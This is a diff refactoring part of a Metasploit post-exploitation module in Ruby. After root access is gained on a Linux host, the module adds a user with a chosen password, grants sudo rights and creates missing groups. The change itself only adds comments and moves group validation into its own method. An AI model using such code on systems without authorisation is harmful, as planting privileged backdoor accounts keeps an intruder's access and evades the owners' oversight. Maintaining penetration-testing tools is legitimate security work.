@@ -44,6 +44,7 @@ class MetasploitModule < Msf::Post
     ])
   end
 
+  # Checks if the given group exists within the system
   def check_group_exists?(group_name, group_data)
     return group_data =~ /^#{Regexp.escape(group_name)}:/
   end
@@ -67,6 +68,7 @@ class MetasploitModule < Msf::Post
     print_line(cmd_exec(command))
   end
 
+  # Produces an altered copy of the group file with the user added to each group
   def fs_add_groups(group_file, groups)
     groups.each do |group|
       # Add user to group if there are other users
@@ -85,9 +87,11 @@ class MetasploitModule < Msf::Post
     group_file.gsub(/\n{2,}/, "\n")
   end
 
+  # Provides a list of groups that arent already on the system
   def get_missing_groups(group_file, groups)
     groups.reject { |group| check_group_exists?(group, group_file) }
   end
+
   # Finds out what platform the module is running on. It will attempt to access
   # the Hosts database before making more noise on the target to learn more
   def os_platform
@@ -105,24 +109,10 @@ class MetasploitModule < Msf::Post
     end
   end
 
-  def run
-    fail_with(Failure::NoAccess, 'Session isnt running as root') unless is_root?
-    case datastore['UseraddMethod']
-    when 'CUSTOM'
-      fail_with(Failure::NotFound, "Cannot find command on path given: #{datastore['UseraddBinary']}") unless check_command_exists?(datastore['UseraddBinary'])
-    when 'AUTO'
-      fail_with(Failure::NotVulnerable, 'Cannot find a means to add a new user') unless check_command_exists?('useradd') || check_command_exists?('adduser')
-    end
-    fail_with(Failure::NotVulnerable, 'Cannot add user to sudo as sudoers doesnt exist') unless datastore['SudoMethod'] != 'SUDO_FILE' || file_exist?('/etc/sudoers')
-    fail_with(Failure::NotFound, 'Shell specified does not exist on system') unless check_command_exists?(datastore['SHELL'])
-    fail_with(Failure::BadConfig, "Username [#{datastore['USERNAME']}] is not a legal unix username.") unless datastore['USERNAME'] =~ /^[a-z][a-z0-9_-]{0,31}$/
-
-    # Encrypting password ahead of time
-    passwd = UnixCrypt::MD5.build(datastore['PASSWORD'])
-
-    # Adding sudo to groups if method is set to use groups
-    groups = datastore['GROUPS']&.split || []
-    groups += ['sudo'] if datastore['SudoMethod'] == 'GROUP'
+  # Validates the groups given to it. Depending on datastore settings, it will
+  # give a trimmed down list of the groups given to it, and ensure that all
+  # groups returned exist on the system.
+  def validate_groups(group_file, groups)
     groups = groups.uniq
 
     # Check that group names are valid
@@ -136,9 +126,7 @@ class MetasploitModule < Msf::Post
     end
 
     # Check to see that groups exist or fail
-    group_file = read_file('/etc/group').to_s
     groups_missing = get_missing_groups(group_file, groups)
-
     unless groups_missing.empty?
       if datastore['MissingGroups'] == 'ERROR'
         fail_with(Failure::NotFound, "groups [#{groups_missing.join(' ')}] do not exist on the system. Change the `MissingGroups` Option to deal with errors automatically")
@@ -160,6 +148,29 @@ class MetasploitModule < Msf::Post
         print_good("Added #{group} group")
       end
     end
+    groups
+  end
+
+  def run
+    fail_with(Failure::NoAccess, 'Session isnt running as root') unless is_root?
+    case datastore['UseraddMethod']
+    when 'CUSTOM'
+      fail_with(Failure::NotFound, "Cannot find command on path given: #{datastore['UseraddBinary']}") unless check_command_exists?(datastore['UseraddBinary'])
+    when 'AUTO'
+      fail_with(Failure::NotVulnerable, 'Cannot find a means to add a new user') unless check_command_exists?('useradd') || check_command_exists?('adduser')
+    end
+    fail_with(Failure::NotVulnerable, 'Cannot add user to sudo as sudoers doesnt exist') unless datastore['SudoMethod'] != 'SUDO_FILE' || file_exist?('/etc/sudoers')
+    fail_with(Failure::NotFound, 'Shell specified does not exist on system') unless check_command_exists?(datastore['SHELL'])
+    fail_with(Failure::BadConfig, "Username [#{datastore['USERNAME']}] is not a legal unix username.") unless datastore['USERNAME'] =~ /^[a-z][a-z0-9_-]{0,31}$/
+
+    # Encrypting password ahead of time
+    passwd = UnixCrypt::MD5.build(datastore['PASSWORD'])
+
+    # Adding sudo to groups if method is set to use groups
+    groups = datastore['GROUPS']&.split || []
+    groups += ['sudo'] if datastore['SudoMethod'] == 'GROUP'
+    group_file = read_file('/etc/group').to_s
+    groups = validate_groups(group_file, groups)
 
     # Automatically ignore setting groups if added additional groups is empty
     groups_handled = groups.empty?
